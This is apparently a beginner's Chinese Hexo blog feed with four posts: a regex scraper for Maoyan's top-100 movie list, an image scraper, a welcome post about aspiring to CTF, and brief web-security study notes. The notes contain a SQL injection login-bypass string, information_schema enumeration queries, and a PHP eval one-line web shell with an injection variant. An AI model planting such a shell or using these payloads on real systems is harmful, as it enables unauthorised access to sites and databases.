<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>晨曦远的博客</title>
  
  <subtitle>诗酒趁年华</subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="%5Bobject%20Object%5D" rel="hub"/>
  <link href="http://yoursite.com/"/>
  <updated>2018-10-26T08:22:31.000Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>晨曦远</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>爬取猫眼电影top100</title>
    <link href="http://yoursite.com/2018/10/26/%E7%88%AC%E5%8F%96%E7%8C%AB%E7%9C%BC%E7%94%B5%E5%BD%B1top100/"/>
    <id>http://yoursite.com/2018/10/26/爬取猫眼电影top100/</id>
    <published>2018-10-26T03:21:55.000Z</published>
    <updated>2018-10-26T08:22:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>昨天学了正则，有点膨胀，来爬爬猫眼电影top100试试看。<a href="http://maoyan.com/board/4" target="_blank" rel="noopener">http://maoyan.com/board/4</a></p><h2 id="用到的模块"><a href="#用到的模块" class="headerlink" title="用到的模块"></a>用到的模块</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="用正则表达式匹配下载当页信息"><a href="#用正则表达式匹配下载当页信息" class="headerlink" title="用正则表达式匹配下载当页信息"></a>用正则表达式匹配下载当页信息</h2><p>首先打开网页，右键霸王别姬检查元素，可以发现我们要提取的信息。<br><img src="http://i1.fuimg.com/665720/60804d00d7b1ebd8.png" alt="箭头就是我们要提取的内容"><br>接下来就是写代码用正则把内匹配下来<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36'</span>&#125;</span><br><span class="line">r = requests.get(<span class="string">'http://maoyan.com/board/4?offset=0'</span>,headers=headers)</span><br><span class="line">results = re.findall(</span><br><span class="line">        <span class="string">'&lt;a.*?title="(.*?)".*?class="image-link".*?class="star"&gt;(.*?)&lt;/p&gt;.*?&lt;p class="releasetime"&gt;(.*?)&lt;/p&gt;.*?&lt;i class="integer"&gt;(.*?)&lt;/i&gt;&lt;i class="fraction"&gt;(.*?)&lt;/i&gt;&lt;/p&gt; '</span>,</span><br><span class="line">        r.text, re.S)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">findall方法会把匹配到的小括号里的一组内容加工成元组，再把所有元组以列表形式返回</span></span><br><span class="line"><span class="string">.*?可以非贪婪匹配任意除换行字符，只要把想提取的内容以.*?代替就好了，再加个小括号</span></span><br><span class="line"><span class="string">我们只需要写要提取的内容前面和后面的几个字符就好了，其他的冗长字符也可用.*?代替</span></span><br><span class="line"><span class="string">第二个参数是被匹配的文本，传入网页源代码即可</span></span><br><span class="line"><span class="string">因为标签之间还有好多换行，而.*?无法匹配换行，加上re.S这个参数，就可以匹配到了</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p><p>再写个循环把提取到的内容写进txt文件即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> results:</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'top100.txt'</span>, <span class="string">'a'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(i[<span class="number">0</span>] + <span class="string">' '</span> + re.sub(<span class="string">'\n\s+'</span>, <span class="string">''</span>, str(i[<span class="number">1</span>])) + <span class="string">' '</span> + i[<span class="number">2</span>] + <span class="string">' '</span> + <span class="string">'评分：'</span> + i[<span class="number">3</span>] + i[<span class="number">4</span>] + <span class="string">'\n'</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">a表示追加写入，要加上encoding='utf-8'，不然会编码错误</span></span><br><span class="line"><span class="string">i[0] i[1]等表示当前列表里的某个元组的第几个内容</span></span><br><span class="line"><span class="string">我们会发现元组里的第二个内容有许多空格和换行，所以我们用sub方法拿''空字符替换掉，第一个参数是被替换字符，第二个参数是替换字符，第三个参数是被操作的文本，所以我们需要把元组的内容转换成字符串。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p><h2 id="写个循环爬取所有页面的内容"><a href="#写个循环爬取所有页面的内容" class="headerlink" title="写个循环爬取所有页面的内容"></a>写个循环爬取所有页面的内容</h2><p>我们发现网页的地址格式是<a href="http://maoyan.com/board/4?offset=" target="_blank" rel="noopener">http://maoyan.com/board/4?offset=</a> + 0,10,20,30…100<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">110</span>,<span class="number">10</span>):</span><br><span class="line">    url = <span class="string">'http://maoyan.com/board/4?offset='</span> + str(i)</span><br><span class="line"><span class="string">'''第三个参数是步长，即每次增加10，因为range里的两个数字是前闭后开，所以第二个参数要比100大，这样我们就得到0,10,20到100的数</span></span><br><span class="line"><span class="string">然后再把上面的代码写成函数，在这个循环里调用即可</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p><h2 id="这次我终于用上函数了"><a href="#这次我终于用上函数了" class="headerlink" title="这次我终于用上函数了"></a>这次我终于用上函数了</h2><p>附上全部代码,原谅小白的代码吧。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_information</span><span class="params">(url)</span>:</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4094.1 Safari/537.36'</span>&#125;</span><br><span class="line">    r = requests.get(url,headers=headers)</span><br><span class="line">    result = re.findall(</span><br><span class="line">        <span class="string">'&lt;a.*?title="(.*?)".*?class="image-link".*?class="star"&gt;(.*?)&lt;/p&gt;.*?&lt;p class="releasetime"&gt;(.*?)&lt;/p&gt;.*?&lt;i class="integer"&gt;(.*?)&lt;/i&gt;&lt;i class="fraction"&gt;(.*?)&lt;/i&gt;&lt;/p&gt; '</span>,</span><br><span class="line">        r.text, re.S)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'top100.txt'</span>, <span class="string">'a'</span>,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(i[<span class="number">0</span>] + <span class="string">' '</span> + re.sub(<span class="string">'\n\s+'</span>, <span class="string">''</span>, str(i[<span class="number">1</span>])) + <span class="string">' '</span> + i[<span class="number">2</span>] + <span class="string">' '</span> + <span class="string">'评分：'</span> + i[<span class="number">3</span>] + i[<span class="number">4</span>] + <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">110</span>,<span class="number">10</span>):</span><br><span class="line">    url = <span class="string">'http://maoyan.com/board/4?offset='</span> + str(i)</span><br><span class="line">    get_information(url)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;昨天学了正则，有点膨胀，来爬爬猫眼电影top100试试看。&lt;a href=&quot;http://maoyan.com/board/4&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://maoyan.com/board/4&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;用到的模块&quot;&gt;&lt;a href=&quot;#用到的模块&quot; class=&quot;headerlink&quot; title=&quot;用到的模块&quot;&gt;&lt;/a&gt;用到的模块&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; re&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="python初学笔记" scheme="http://yoursite.com/categories/python%E5%88%9D%E5%AD%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
      <category term="爬虫" scheme="http://yoursite.com/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>菜鸟初学python爬虫</title>
    <link href="http://yoursite.com/2018/10/22/%E8%8F%9C%E9%B8%9F%E5%88%9D%E5%AD%A6python%E7%88%AC%E8%99%AB/"/>
    <id>http://yoursite.com/2018/10/22/菜鸟初学python爬虫/</id>
    <published>2018-10-22T14:02:59.000Z</published>
    <updated>2018-10-24T00:03:33.269Z</updated>
    
    <content type="html"><![CDATA[<p>菜鸟初学python爬虫，爬一个没有反爬的炒鸡简单的网站。<a href="http://www.mzitu.com/zipai/" target="_blank" rel="noopener">http://www.mzitu.com/zipai/</a></p><h2 id="用到的模块"><a href="#用到的模块" class="headerlink" title="用到的模块"></a>用到的模块</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="找到当前页面图片地址"><a href="#找到当前页面图片地址" class="headerlink" title="找到当前页面图片地址"></a>找到当前页面图片地址</h2><p>首先打开网站，右键图片点击检查，发现图片地址在p标签下的img标签中储存。<br><img src="http://i4.bvimg.com/665720/11eb941007bbf352.png" alt="右键图片点击检查"><br>先用get方法获取页面内容，再用BeautifulSoup煲汤。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(<span class="string">'http://www.mzitu.com/zipai/'</span>)</span><br><span class="line">soup = BeautifulSoup(r.text,<span class="string">'lxml'</span>) <span class="comment">#需要 pip install lxml</span></span><br><span class="line">list1 = []</span><br><span class="line">list1 = soup.select(<span class="string">'p &gt; img'</span>)</span><br></pre></td></tr></table></figure></p><p>然后再用for循环提取出img的属性<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">list2 =[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:    </span><br><span class="line">    list2.append(i.get(<span class="string">'src'</span>))</span><br><span class="line">    print(i.get(<span class="string">'src'</span>))</span><br></pre></td></tr></table></figure></p><h2 id="下载图片"><a href="#下载图片" class="headerlink" title="下载图片"></a>下载图片</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">os.mkdir(<span class="string">'D:/妹子图'</span>)</span><br><span class="line">os.chdir(<span class="string">'D:/妹子图'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list2:    </span><br><span class="line">    img = requests.get(i)</span><br><span class="line">    filename = i.split(<span class="string">'/'</span>)[<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">with</span> open(filename,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(img.content)</span><br></pre></td></tr></table></figure><h2 id="循环每个页面"><a href="#循环每个页面" class="headerlink" title="循环每个页面"></a>循环每个页面</h2><p>很容易可以观察到，地址的格式是”<a href="http://www.mzitu.com/zipai/comment-page-&quot;+" target="_blank" rel="noopener">http://www.mzitu.com/zipai/comment-page-&quot;+</a> 页数+”/#comments”<br>因此写个for循环即可遍历地址<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">365</span>):</span><br><span class="line">    url =<span class="string">"http://www.mzitu.com/zipai/comment-page-"</span>+ str(i)+<span class="string">"/#comments"</span></span><br></pre></td></tr></table></figure></p><p>再把url传入上面的方法即可。</p><h2 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h2><p>因为本人是单身狗，怠惰于面向对象编程，所以代码被我写在一团，实际可以定义几个函数，提升代码的可读性和美观性。<br>下面贴上完整代码，大佬勿喷，哈哈。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.mkdir(<span class="string">'D:/妹子图'</span>)</span><br><span class="line">os.chdir(<span class="string">'D:/妹子图'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">365</span>):</span><br><span class="line">    url =<span class="string">"http://www.mzitu.com/zipai/comment-page-"</span>+ str(i)+<span class="string">"/#comments"</span> </span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    soup = BeautifulSoup(r.text,<span class="string">'lxml'</span>)</span><br><span class="line">    list1 = soup.select(<span class="string">'p &gt; img'</span>)</span><br><span class="line">    list2 =[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> list1:    </span><br><span class="line">        list2.append(i.get(<span class="string">'src'</span>))</span><br><span class="line">        print(i.get(<span class="string">'src'</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> list2:    </span><br><span class="line">        img = requests.get(i)</span><br><span class="line">        filename = i.split(<span class="string">'/'</span>)[<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">with</span> open(filename,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(img.content)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;菜鸟初学python爬虫，爬一个没有反爬的炒鸡简单的网站。&lt;a href=&quot;http://www.mzitu.com/zipai/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.mzitu.com/zipai/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;用到的模块&quot;&gt;&lt;a href=&quot;#用到的模块&quot; class=&quot;headerlink&quot; title=&quot;用到的模块&quot;&gt;&lt;/a&gt;用到的模块&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; bs4 &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; BeautifulSoup&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; os&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="python初学笔记" scheme="http://yoursite.com/categories/python%E5%88%9D%E5%AD%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
      <category term="爬虫" scheme="http://yoursite.com/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>菜鸟初学web</title>
    <link href="http://yoursite.com/2018/10/19/%E8%8F%9C%E9%B8%9F%E5%88%9D%E5%AD%A6web/"/>
    <id>http://yoursite.com/2018/10/19/菜鸟初学web/</id>
    <published>2018-10-19T08:56:36.000Z</published>
    <updated>2018-10-20T07:40:17.585Z</updated>
    
    <content type="html"><![CDATA[<p><br></p><h2 id="密码绕过漏洞"><a href="#密码绕过漏洞" class="headerlink" title="密码绕过漏洞:"></a>密码绕过漏洞:</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' or 1=1 '1</span><br></pre></td></tr></table></figure><p><br><br><a id="more"></a></p><hr><p><br></p><h2 id="mysql手工注入"><a href="#mysql手工注入" class="headerlink" title="mysql手工注入:"></a>mysql手工注入:</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">""</span>;</span><br></pre></td></tr></table></figure><p><br></p><hr><p><br></p><h2 id="php一句话木马"><a href="#php一句话木马" class="headerlink" title="php一句话木马:"></a>php一句话木马:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[  <span class="string">'pass'</span>  ]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="string">"?&gt;&lt;?php @eval($_POST[  'pass'  ]);?&gt;&lt;?php#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;h2 id=&quot;密码绕过漏洞&quot;&gt;&lt;a href=&quot;#密码绕过漏洞&quot; class=&quot;headerlink&quot; title=&quot;密码绕过漏洞:&quot;&gt;&lt;/a&gt;密码绕过漏洞:&lt;/h2&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&#39; or 1=1 &#39;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;br&gt;&lt;br&gt;
    
    </summary>
    
      <category term="web安全学习笔记" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="sql漏洞" scheme="http://yoursite.com/tags/sql%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Welcome to my blog.</title>
    <link href="http://yoursite.com/2018/10/18/My%20first%20blog/"/>
    <id>http://yoursite.com/2018/10/18/My first blog/</id>
    <published>2018-10-18T15:44:28.000Z</published>
    <updated>2018-10-20T07:40:45.763Z</updated>
    
    <content type="html"><![CDATA[<hr><hr><a id="more"></a><p><br><br><br><br><br></p><p><strong>学校里全是dalao，加油鸭！</strong><br><br><br><strong>一定要成为一名牛逼的CTFer！不负自己，未来可期！</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;hr&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://yoursite.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
</feed>
